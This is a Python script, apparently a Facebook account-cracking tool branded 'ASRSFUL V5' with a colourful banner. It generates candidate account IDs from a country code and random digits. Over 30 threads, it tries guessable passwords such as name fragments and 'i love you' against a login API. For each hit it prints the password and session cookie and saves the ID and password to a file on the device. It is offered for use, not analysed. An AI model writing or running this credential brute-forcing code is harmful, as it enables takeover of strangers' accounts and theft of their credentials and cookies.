...
DX_POWER_143 = requests.get("https://raw.githubusercontent.com/bipul159/ua.txt/main/random-ua").text.splitlines()

tanim = random.choice(DX_POWER_143)      
        
logo= ("""        
        \x1b[38;5;83m╔═╗┌─┐┬─┐┌─┐┌─┐┬ ┬┬  
        \x1b[38;5;84m╠═╣└─┐├┬┘├─┤├┤ │ ││  
        \x1b[38;5;85m╩ ╩└─┘┴└─┴ ┴└  └─┘┴─┘\x1b[38;5;197m(V5)
\x1b[033;34;1m──────────────────────────────────────────────                 
\x1b[38;5;78m〘💸〙DEVLOPER  \x1b[38;5;222m💸  \x1b[38;5;78m ASHRAFUL SHAH
\x1b[38;5;79m〘💸〙FACEBOOK  \x1b[38;5;222m💸  \x1b[38;5;79m ASRSFUL 
...
def bhoot():
    ...
    with ThreadPool(max_workers=30) as TANIM:
        ...
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'shakib','i love you','sadiya','sumaiya','jannat']
            ids = code+love
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\x1b[38;5;155m[💸] ASRSFUL~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[ASRSFUL-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                print('\033[1;92m[COOKIE] : 💸 : '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/ASRSFUL-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
